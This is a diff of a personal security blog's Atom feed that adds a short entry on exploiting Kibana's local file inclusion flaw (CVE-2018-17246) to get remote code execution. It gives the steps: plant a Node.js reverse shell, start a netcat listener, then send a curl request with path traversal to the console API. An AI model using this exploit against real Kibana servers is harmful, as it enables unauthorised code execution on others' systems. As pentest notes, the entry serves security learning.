@@ -4,13 +4,46 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-03-11T19:16:18+08:00</updated>
+ <updated>2022-03-15T23:50:03+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Kibana LFI to RCE</title>
+   <link href="https://mvineza.github.io/spindel/2022/03/15/kibana-lfi-to-rce"/>
+   <updated>2022-03-15T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/03/15/Kibana-LFI-to-RCE</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Attacker can achieve RCE by including a node js reverse shell via LFI and RFI&lt;/p&gt;
+
+&lt;h2 id=&quot;affected-versions&quot;&gt;Affected Versions&lt;/h2&gt;
+&lt;p&gt;Versions before 6.4.3 and 5.6.13.&lt;/p&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Put your node js reverse shell in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; of victim machine via file upload&lt;/li&gt;
+  &lt;li&gt;Open netcat listener on attacker machine&lt;/li&gt;
+  &lt;li&gt;Do an LFI&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# this example assumes you have access inside the victim via file upload&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# or any other means&lt;/span&gt;
+curl &lt;span class=&quot;s1&quot;&gt;'http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=../../../../../../../../../../../tmp/evil.js'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.elastic.co/blog/kibana-local-file-inclusion-flaw-cve-2018-17246&quot;&gt;Resolving Kibana Local File Inclusion Flaw CVE-2018-17246&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;GitHub - mpgn/CVE-2018-17246: CVE-2018-17246 - Kibana LFI &amp;lt; 6.4.3 &amp;amp; 5.6.13&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/harsh-bothra/learn365/blob/main/days/day32.md&quot;&gt;learn365/day32.md at main · harsh-bothra/learn365 · GitHub&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>PHP XDebug</title>
